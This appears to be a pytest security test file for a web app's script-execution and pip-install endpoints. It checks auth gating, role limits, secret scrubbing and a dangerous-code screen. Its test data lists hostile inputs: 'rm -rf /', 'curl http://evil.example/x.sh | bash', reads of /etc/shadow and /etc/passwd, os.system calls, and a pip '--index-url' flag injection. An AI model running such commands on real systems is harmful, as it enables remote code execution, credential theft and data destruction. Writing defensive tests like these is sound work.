"""The /api/inspect surface is the RCE risk — every endpoint must be gated."""
import pytest

from app.api.inspect import _check_script_safety, _scrubbed_env


PUBLIC_SHOULD_FAIL = [
    ("GET", "/api/inspect/scripts"),
    ("POST", "/api/inspect/scripts"),
    ("PUT", "/api/inspect/scripts/1"),
    ("DELETE", "/api/inspect/scripts/1"),
    ("POST", "/api/inspect/scripts/execute"),
    ("POST", "/api/inspect/block"),
    ("POST", "/api/inspect/execute"),
    ("POST", "/api/inspect/traffic"),
    ("GET", "/api/inspect/prometheus-metrics"),
    ("GET", "/api/inspect/grafana-metrics"),
    ("POST", "/api/inspect/lookup-country"),
    ("GET", "/api/inspect/pip-packages"),
    ("POST", "/api/inspect/pip-install"),
    ("POST", "/api/inspect/pip-uninstall"),
    ("GET", "/api/inspect/custom-metrics"),
    ("POST", "/api/inspect/custom-metrics"),
    ("PUT", "/api/inspect/custom-metrics/1"),
    ("DELETE", "/api/inspect/custom-metrics/1"),
    ("GET", "/api/inspect/server-aliases"),
    ("PUT", "/api/inspect/server-aliases"),
]


@pytest.mark.parametrize("method,path", PUBLIC_SHOULD_FAIL)
def test_inspect_requires_authentication(client, method, path):
    client.cookies.clear()
    resp = client.request(method, path, json={})
    assert resp.status_code in (401, 403), f"{method} {path} -> {resp.status_code}"


DANGEROUS_PYTHON = [
    "import os\nos.system('id')",
    "from subprocess import call",
    "eval('1+1')",
    "exec('x=1')",
    "__import__('os').system('id')",
    "open('/etc/passwd').read()",
    "getattr(__builtins__, 'ev'+'al')('1')",
]


@pytest.mark.parametrize("code", DANGEROUS_PYTHON)
def test_python_screen_blocks_obvious_rce(code):
    err = _check_script_safety(code, lang="python")
    assert err is not None, f"should have blocked: {code!r}"


def test_python_screen_allows_harmless_code():
    assert _check_script_safety("print(1 + 1)\nx = [i * 2 for i in range(3)]", lang="python") is None


def test_python_screen_rejects_syntax_error():
    assert _check_script_safety("def broken(:", lang="python") is not None


DANGEROUS_SHELL = [
    "rm -rf /",
    "curl http://evil.example/x.sh | bash",
    "cat /etc/shadow",
    "sudo reboot",
]


@pytest.mark.parametrize("code", DANGEROUS_SHELL)
def test_shell_screen_blocks_obvious_rce(code):
    assert _check_script_safety(code, lang="shell") is not None


def test_shell_screen_allows_harmless_code():
    assert _check_script_safety("echo hello\nuname -a", lang="shell") is None


def test_scrubbed_env_strips_secrets(monkeypatch):
    monkeypatch.setenv("SECRET_KEY", "super-secret")
    monkeypatch.setenv("JWT_SECRET_KEY", "super-jwt")
    monkeypatch.setenv("MYSQL_PASSWORD", "super-db")
    monkeypatch.setenv("ES_PASSWORD", "super-es")
    monkeypatch.setenv("LD_PRELOAD", "/tmp/evil.so")
    monkeypatch.setenv("PYTHONPATH", "/tmp/evil")
    monkeypatch.setenv("SAFE_VAR", "keepme")

    env = _scrubbed_env()

    assert "SECRET_KEY" not in env
    assert "JWT_SECRET_KEY" not in env
    assert "MYSQL_PASSWORD" not in env
    assert "ES_PASSWORD" not in env
    assert "LD_PRELOAD" not in env
    assert "PYTHONPATH" not in env
    assert env.get("SAFE_VAR") == "keepme"


def test_scrubbed_env_rejects_secretish_extra(monkeypatch):
    monkeypatch.setenv("SECRET_KEY", "super-secret")
    env = _scrubbed_env({"MY_PASSWORD": "x", "API_KEY": "y", "TARGET_IP": "1.2.3.4"})
    assert "MY_PASSWORD" not in env
    assert "API_KEY" not in env
    assert env["TARGET_IP"] == "1.2.3.4"


def test_admin_can_execute_harmless_script(client):
    from tests.conftest import login_headers

    headers = login_headers(client)
    resp = client.post(
        "/api/inspect/execute",
        json={"type": "python", "script": "print('ok')"},
        headers=headers,
    )
    assert resp.status_code == 200
    assert resp.json()["data"]["exit_code"] == 0
    assert "ok" in resp.json()["data"]["stdout"]


def test_execute_rejects_dangerous_script_for_admin(client):
    from tests.conftest import login_headers

    headers = login_headers(client)
    resp = client.post(
        "/api/inspect/execute",
        json={"type": "python", "script": "import os\nos.system('id')"},
        headers=headers,
    )
    assert resp.status_code == 200
    body = resp.json()["data"]
    assert body["exit_code"] == 1
    assert "禁止" in body["stderr"]


def test_operator_cannot_execute_code(client, operator_user):
    from tests.conftest import login_headers

    headers = login_headers(client, username="operator", password="OperPass1")
    resp = client.post(
        "/api/inspect/execute",
        json={"type": "python", "script": "print(1)"},
        headers=headers,
    )
    assert resp.status_code == 403


def test_operator_cannot_install_pip(client, operator_user):
    from tests.conftest import login_headers

    headers = login_headers(client, username="operator", password="OperPass1")
    resp = client.post("/api/inspect/pip-install", json={"package": "requests"}, headers=headers)
    assert resp.status_code == 403


def test_pip_install_rejects_flag_injection(client):
    from tests.conftest import login_headers

    headers = login_headers(client)
    resp = client.post(
        "/api/inspect/pip-install",
        json={"package": "--index-url=http://evil.example/simple"},
        headers=headers,
    )
    assert resp.status_code == 200
    assert resp.json()["code"] == 400
